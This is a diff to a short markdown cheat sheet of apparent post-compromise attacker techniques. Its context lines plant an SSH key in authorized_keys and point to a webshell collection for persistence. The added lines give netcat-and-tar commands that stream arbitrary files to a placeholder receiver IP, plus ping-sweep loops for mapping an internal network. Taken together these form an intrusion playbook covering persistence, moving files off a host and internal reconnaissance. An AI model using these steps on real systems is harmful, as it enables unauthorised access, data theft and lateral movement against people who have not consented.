@@ -33,10 +33,27 @@ scp ~/.ssh/id_rsa.pub your_username@192.0.2.0:~/.ssh/authorized_keys
 ## install webshell for persistence 
 https://github.com/tennc/webshell
 
-## Use Netcat to setup a connection back to the attack machine
+## NetCat File Transfer:
+nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files". open a listen on port 12345, waiting for data.
 
-scan the Interior Network: 
+1. on the receiver side, run:
+```
+nc -l 12345 | tar -xf -
+```
+2. on the sender side:
+```
+tar -cf - ALL_FILES_YOU_WANT_TO_SEND ... | nc $RECEIVER_IP 12345
+```
+2a. 
+You can also put pv in the middle to monitor the progress of transferring:
+```
+tar -cf - ALL_FILES_YOU_WANT_TO_SEND ...| pv | nc $RECEIVER_IP 12345
+```
+After the transferring is finished, both sides of nc will quit automatically, and job done.
+
+### scan the Interior Network: 
 for i in {1..254}; do ping -c 1 192.168.1.i; done 
+
 for i in {1..254}; do for x in {1..254}; do ping -c 1 10.0.x.i; done; done 
 
 
